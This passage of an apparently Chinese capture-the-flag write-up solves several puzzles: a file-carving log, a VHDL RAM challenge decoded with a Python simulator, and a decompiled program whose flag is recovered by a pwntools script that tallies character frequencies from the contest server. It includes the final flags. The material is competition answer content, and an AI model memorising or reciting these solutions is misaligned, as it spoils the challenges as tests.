  - Unknown:  f_00006c                       (Type: Unknown Binary)
  - Unknown:  f_00006d                       (Type: Unknown Binary)
  - Unknown:  f_00006e                       (Type: Unknown Binary)
  - Unknown:  f_00006f                       (Type: Unknown Binary)
  - Unknown:  f_000070                       (Type: Unknown Binary)
  - Unknown:  f_000071                       (Type: Unknown Binary)
  - Unknown:  f_000072                       (Type: Unknown Binary)
  - Unknown:  f_000073                       (Type: Unknown Binary)
  - Unknown:  f_000074                       (Type: Unknown Binary)
  - Unknown:  f_000075                       (Type: Unknown Binary)
  - Unknown:  f_000076                       (Type: Unknown Binary)
  - Unknown:  f_000077                       (Type: Unknown Binary)
  - Unknown:  f_000078                       (Type: Unknown Binary)
  - Unknown:  f_000079                       (Type: Unknown Binary)
  - Unknown:  f_00007a                       (Type: Unknown Binary)
  - Unknown:  f_00007b                       (Type: Unknown Binary)
  - Unknown:  f_00007c                       (Type: Unknown Binary)
  - Unknown:  f_00007d                       (Type: Unknown Binary)
  - Unknown:  f_00007e                       (Type: Unknown Binary)
  - Unknown:  f_00007f                       (Type: Unknown Binary)
  - Unknown:  f_000080                       (Type: Unknown Binary)
  - Unknown:  f_000081                       (Type: Unknown Binary)
  - Renamed:  f_000082                       -> f_000082.mkv (MKV File)
  - Renamed:  f_000083                       -> f_000083.mp3 (MP3 File)
  - Unknown:  f_000084                       (Type: Unknown Binary)
  - Unknown:  f_000085                       (Type: Unknown Binary)
  - Unknown:  f_000086                       (Type: Unknown Binary)
  - Unknown:  f_000087                       (Type: Unknown Binary)
  - Renamed:  f_000088                       -> f_000088.png (PNG File)
  - Renamed:  f_000089                       -> f_000089.png (PNG File)
  - Unknown:  f_00008a                       (Type: Unknown Binary)
  - Unknown:  f_00008c                       (Type: Unknown Binary)
  - Unknown:  f_00008d                       (Type: Unknown Binary)
  - Renamed:  f_00008e                       -> f_00008e.mp3 (MP3 File)
  - Renamed:  f_00008f                       -> f_00008f.gz (GZ File)
  - Renamed:  f_000090                       -> f_000090.png (PNG File)
  - Unknown:  index                          (Type: Unknown Binary)

============================================================
                      Process Summary
============================================================
  - Files Renamed: 45
  - Files Skipped (already had extension): 0
  - Files with Unknown Type: 103
  - Renaming Errors: 0

============================================================
                 Identified File Type Counts
============================================================
  - WEBP Image               : 21 file(s)
  - JPG File                 : 10 file(s)
  - PNG File                 : 5 file(s)
  - MP3 File                 : 4 file(s)
  - GZ File                  : 3 file(s)
  - MKV File                 : 2 file(s)
============================================================
```



```
uscg{look_ma_i_deobfuscated_it}
```



```
cube{-33.41,-70.61}
```



```
│  summerinternproject.xpr
│
├─summerinternproject.cache
│  ├─compile_simlib
│  │  ├─activehdl
│  │  ├─modelsim
│  │  ├─questa
│  │  ├─riviera
│  │  ├─vcs
│  │  └─xcelium
│  └─wt
│          project.wpc
│          xsim.wdf
│
├─summerinternproject.hw
│      summerinternproject.lpr
│
├─summerinternproject.ip_user_files
│      README.txt
│
├─summerinternproject.sim
│  └─sim_1
│      └─behav
│          └─xsim
│                  compile.bat
│                  ctf_testbench.tcl
│                  ctf_testbench_behav.wdb
│                  ctf_testbench_vhdl.prj
│                  elaborate.bat
│                  elaborate.log
│                  simulate.bat
│                  simulate.log
│                  xelab.pb
│                  xsim.ini
│                  xvhdl.log
│                  xvhdl.pb
│
└─summerinternproject.srcs
    ├─sim_1
    │  └─new
    │          ctf_testbench.vhd
    │
    └─sources_1
        └─new
                controller_ctf.vhd
                ctf.vhd
                datapath_ctf.vhd
                ram.vhd
```



```
if rising_edge(clk) then
    dout <= RAM(to_integer(unsigned(addr))) AND "0000000011111111";
    if we = '1' then
        RAM(to_integer(unsigned(addr))) := din;
    end if;
end if;
```



```
constant test_data : input_array := (
    x"1275", x"D453", x"9E77", x"AA9B",  --3
    x"0167", x"8073", x"8972", x"C053", --7
    x"D166", x"0850", x"1C63", x"A466", --11
    x"C973", x"0E75", x"1F50", x"2067", --15
    x"E353", x"B275", x"7F6E", x"FE64", --19
    x"A963", x"DA63", x"016D", x"9A7F", --23
    x"C07F", x"1474", x"D474", x"B99D", --27
    x"E370", x"C361", x"A366", x"D07F" --31
);
```



```
def get_flag_from_din(din_values):
    """
    根据给定的din输入序列，模拟VHDL电路的行为来计算最终的flag。

    :param din_values: 一个包含32个整数的列表，代表输入的din序列。
    :return: 计算出的flag字符串。
    """
    if len(din_values) != 32:
        return"Error: din_values must contain exactly 32 numbers."

    # 步骤 1: 模拟写入阶段，din_values就是RAM的内容
    ram = list(din_values)
    
    flag_chars = [] # 用来存放每个周期计算出的flag字符

    print("Simulating Read & Process Phase...")
    print("-" * 60)
    print("i | read_addr | ram_data (hex) | masked (hex) | result_ascii | char")
    print("-" * 60)

    # 步骤 2: 模拟读出与处理阶段
    for i in range(32):
        # 2a: 计算乱序地址
        read_addr = (i * 5) % 32
        
        # 2b: 从RAM读取数据
        ram_data = ram[read_addr]
        
        # 2c: 屏蔽高8位 (AND 0x00FF)
        masked_data = ram_data & 0xFF
        
        # 2d: 减法运算
        result_ascii = masked_data - 32
        
        # 2e: 转换为字符
        try:
            flag_char = chr(result_ascii)
        except ValueError:
            flag_char = '?'# 如果结果不是有效的ASCII码，用'?'表示
            
        flag_chars.append(flag_char)
        
        # 打印每一步的中间结果
        print(f"{i:2d}| {read_addr:9d} | 0x{ram_data:04x}         | 0x{masked_data:02x}           | {result_ascii:12d} | '{flag_char}'")

    # 步骤 2f: 拼接所有字符得到最终的flag
    final_flag = "".join(flag_chars)
    return final_flag

# ================================================================
# 主程序入口
# 从 ctf_testbench.vhd 提取出的数据
# ================================================================
din_values_from_testbench = [
    0x1275, 0xD453, 0x9E77, 0xAA9B,
    0x0167, 0x8073, 0x8972, 0xC053,
    0xD166, 0x0850, 0x1C63, 0xA466,
    0xC973, 0x0E75, 0x1F50, 0x2067,
    0xE353, 0xB275, 0x7F6E, 0xFE64,
    0xA963, 0xDA63, 0x016D, 0x9A7F,
    0xC07F, 0x1474, 0xD474, 0xB99D,
    0xE370, 0xC361, 0xA366, 0xD07F
]

# 运行模拟器
flag = get_flag_from_din(din_values_from_testbench)

print("n" + "=" * 60)
print(f"The calculated flag is: {flag}")
print("=" * 60)
```



```
Simulating Read & Process Phase...
------------------------------------------------------------
i | read_addr | ram_data (hex) | masked (hex) | result_ascii | char
------------------------------------------------------------
 0|         0 | 0x1275         | 0x75           |           85 | 'U'
 1|         5 | 0x8073         | 0x73           |           83 | 'S'
 2|        10 | 0x1c63         | 0x63           |           67 | 'C'
 3|        15 | 0x2067         | 0x67           |           71 | 'G'
 4|        20 | 0xa963         | 0x63           |           67 | 'C'
 5|        25 | 0x1474         | 0x74           |           84 | 'T'
 6|        30 | 0xa366         | 0x66           |           70 | 'F'
 7|         3 | 0xaa9b         | 0x9b           |          123 | '{'
 8|         8 | 0xd166         | 0x66           |           70 | 'F'
 9|        13 | 0x0e75         | 0x75           |           85 | 'U'
10|        18 | 0x7f6e         | 0x6e           |           78 | 'N'
11|        23 | 0x9a7f         | 0x7f           |           95 | '_'
12|        28 | 0xe370         | 0x70           |           80 | 'P'
13|         1 | 0xd453         | 0x53           |           51 | '3'
14|         6 | 0x8972         | 0x72           |           82 | 'R'
15|        11 | 0xa466         | 0x66           |           70 | 'F'
16|        16 | 0xe353         | 0x53           |           51 | '3'
17|        21 | 0xda63         | 0x63           |           67 | 'C'
18|        26 | 0xd474         | 0x74           |           84 | 'T'
19|        31 | 0xd07f         | 0x7f           |           95 | '_'
20|         4 | 0x0167         | 0x67           |           71 | 'G'
21|         9 | 0x0850         | 0x50           |           48 | '0'
22|        14 | 0x1f50         | 0x50           |           48 | '0'
23|        19 | 0xfe64         | 0x64           |           68 | 'D'
24|        24 | 0xc07f         | 0x7f           |           95 | '_'
25|        29 | 0xc361         | 0x61           |           65 | 'A'
26|         2 | 0x9e77         | 0x77           |           87 | 'W'
27|         7 | 0xc053         | 0x53           |           51 | '3'
28|        12 | 0xc973         | 0x73           |           83 | 'S'
29|        17 | 0xb275         | 0x75           |           85 | 'U'
30|        22 | 0x016d         | 0x6d           |           77 | 'M'
31|        27 | 0xb99d         | 0x9d           |          125 | '}'

============================================================
The calculated flag is: USCGCTF{FUN_P3RF3CT_G00D_AW3SUM}
============================================================
```



```
USCGCTF{FUN_P3RF3CT_G00D_AW3SUM}
```



```
int __fastcall main(int argc, const char **argv, const char **envp)
{
constchar *s; // r13
size_t v5; // rbx
unsignedint seed; // eax
constchar *s_1; // r14
char v8; // al
int v9; // eax
  _BYTE __abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXY[72]; // [rsp+0h] [rbp-78h] BYREF
unsigned __int64 v11; // [rsp+48h] [rbp-30h]

  v11 = __readfsqword(0x28u);
if ( argc == 2 )
  {
    s = argv[1];
    qmemcpy(
      __abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXY,
      " _abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}",
      0x42uLL);
    v5 = strlen(s);
    seed = time(0LL);
    srand(seed);
    while ( 1 )
    {
      putc(13, _bss_start);
      if ( v5 )
      {
        s_1 = s;
        do
        {
          v8 = *s_1++;
          __abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXY[0] = v8;
          v9 = rand();
          putc((char)__abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXY[v9 % 0x42uLL], _bss_start);
        }
        while ( s_1 != &s[v5] );
      }
      fflush(_bss_start);
      usleep(0x2710u);
    }
  }
  __fprintf_chk(stderr, 2LL, "Usage: %s <flag>n", *argv);
return1;
}
```



```
#!/usr/bin/env python3
from pwn import *
from collections import Counter
import time

# --- 配置 ---
HOST = "incantation.chal.cubectf.com"
PORT = 5757
# 增加收集时间以确保统计结果的稳定性
COLLECTION_DURATION = 60

p = None
try:
    log.info(f"连接到 {HOST}:{PORT}...")
    p = remote(HOST, PORT)

    # --- 1. 动态确定 Flag 长度 (使用累积缓冲) ---
    log.info("正在动态确定 Flag 长度...")
    buffer = b''
    try:
        start_time = time.time()
        while buffer.count(b'r') < 2:
            if time.time() - start_time > 10:
                raise Exception("超时：10秒内未能接收到足够数据")
            
            chunk = p.recv(128, timeout=10)
            ifnot chunk:
                raise Exception("连接关闭或未收到数据")
            buffer += chunk

        first_r_index = buffer.find(b'r')
        second_r_index = buffer.find(b'r', first_r_index + 1)
        flag_len = second_r_index - first_r_index - 1
        
        if flag_len <= 0: raise Exception(f"计算出的Flag长度不合法: {flag_len}")
        log.success(f"成功确定 Flag 长度为: {flag_len}")

    except Exception as e:
        log.error(f"确定Flag长度时出错: {e}")
        if p: p.close()
        exit(1)
    
    # --- 2. 收集数据进行统计 ---
    counts = [Counter() for _ in range(flag_len)]
    
    log.info(f"开始收集数据，持续 {COLLECTION_DURATION} 秒... (请耐心等待)")
    prog = log.progress("数据收集中")
    
    start_time = time.time()
    rounds = 0
    while time.time() - start_time < COLLECTION_DURATION:
        try:
            # 持续将数据读入缓冲区
            buffer += p.recv(4096, timeout=1)
            
            # 处理缓冲区中所有完整的轮次
            whileTrue:
                r_index = buffer.find(b'r')
                if r_index == -1or len(buffer) < r_index + 1 + flag_len:
                    break# 如果找不到'r'或数据不完整，则等待更多数据

                line = buffer[r_index + 1 : r_index + 1 + flag_len].decode(errors='ignore')
                
                if len(line) == flag_len:
                    for i in range(flag_len):
                        counts[i][line[i]] += 1
                    rounds += 1
                    prog.status(f"已收集 {rounds} 轮数据")
                
                # 从buffer中移除已处理的数据
                buffer = buffer[r_index + 1:]

        except EOFError:
            log.warning("连接在收集数据时关闭。")
            break
        except Exception:
            pass

    prog.success(f"数据收集完成，共 {rounds} 轮。")
    
    # --- 3. 分析数据并构建flag ---
    if rounds < 50:
        log.warning(f"收集到的数据轮次较少 ({rounds})，结果可能不准确。")
        if rounds == 0: exit(1)

    log.info("正在分析频率并构建 Flag...")
    flag = []
    print("-" * 40)
    print("位置 | 最高频字符 (次数) | 次高频字符 (次数)")
    print("-" * 40)
    for i in range(flag_len):
        ifnot counts[i]:
            flag.append('?')
            continue
        
        top_two = counts[i].most_common(2)
        most_frequent_char = top_two[0][0]
        flag.append(most_frequent_char)
        
        # 打印置信度检查信息
        if len(top_two) > 1:
            print(f"{i:<4} | '{top_two[0][0]}' ({top_two[0][1]:<5})     | '{top_two[1][0]}' ({top_two[1][1]:<5})")
        else:
            print(f"{i:<4} | '{top_two[0][0]}' ({top_two[0][1]:<5})     | (无)")
            
    print("-" * 40)
    final_flag = "".join(flag)
    log.success(f"分析完成！Flag: {final_flag}")

finally:
    if p:
        p.close()
```



```
┌──(kali㉿kali)-[~/桌面]
└─$ python exp.py
[*] 连接到 incantation.chal.cubectf.com:5757...
[+] Opening connection to incantation.chal.cubectf.com on port 5757: Done
[*] 正在动态确定 Flag 长度...
[+] 成功确定 Flag 长度为: 40
[*] 开始收集数据，持续 60 秒... (请耐心等待)
[+] 数据收集中: 数据收集完成，共 2953 轮。
[!] 连接在收集数据时关闭。
[*] 正在分析频率并构建 Flag...
----------------------------------------
位置 | 最高频字符 (次数) | 次高频字符 (次数)
----------------------------------------
0    | 'c' (73   )     | 'b' (60   )
1    | 'u' (85   )     | '6' (64   )
2    | 'b' (106  )     | 'k' (60   )
3    | 'e' (90   )     | '6' (59   )
4    | '{' (76   )     | 'Q' (61   )
5    | '4' (98   )     | 'g' (60   )
6    | 'b' (81   )     | 'z' (64   )
7    | 'r' (101  )     | 't' (60   )
8    | '4' (79   )     | 'n' (63   )
9    | 'c' (78   )     | 'I' (62   )
10   | '4' (102  )     | 'Q' (63   )
11   | 'd' (82   )     | 'E' (61   )
12   | '4' (78   )     | 'S' (60   )
13   | 'b' (92   )     | 'E' (59   )
14   | 'r' (86   )     | 'L' (67   )
15   | '4' (88   )     | 'd' (69   )
16   | '_' (99   )     | 'Z' (55   )
17   | 's' (105  )     | 'K' (64   )
18   | 'h' (97   )     | 'c' (57   )
19   | '3' (86   )     | 'I' (58   )
20   | 'z' (83   )     | '1' (59   )
21   | '4' (85   )     | 'z' (59   )
22   | 'm' (105  )     | '8' (54   )
23   | '_' (87   )     | 'c' (58   )
24   | 'p' (95   )     | '}' (64   )
25   | 'r' (90   )     | '6' (60   )
26   | '3' (84   )     | 'U' (60   )
27   | 's' (89   )     | 'X' (61   )
28   | 't' (91   )     | 'U' (63   )
29   | '0' (81   )     | 'x' (60   )
30   | '_' (100  )     | 'r' (60   )
31   | '9' (113  )     | 'x' (65   )
32   | '8' (93   )     | 'T' (60   )
33   | 'f' (81   )     | 'X' (58   )
34   | '8' (90   )     | 'c' (70   )
35   | '1' (101  )     | 'Y' (62   )
36   | '4' (69   )     | 'w' (62   )
37   | 'f' (75   )     | 'C' (67   )
38   | 'f' (87   )     | 'u' (61   )
39   | '}' (89   )     | 'Y' (64   )
----------------------------------------
[+] 分析完成！Flag: cube{4br4c4d4br4_sh3z4m_pr3st0_98f814ff}
[*] Closed connection to incantation.chal.cubectf.com port 5757
```



```
cube{4br4c4d4br4_sh3z4m_pr3st0_98f814ff}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753010583-wxsync-2025-07-92d060f7a32586b30b29a83f0de2dd6c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753010586-wxsync-2025-07-753d37b9b9b16a7676620e021a4acf16.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753010589-wxsync-2025-07-8c3cfc99fa6f66302d3b419e97b941cc.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753010591-wxsync-2025-07-e2441e2bc32b51128ffb1e94ef2e8f9c.png)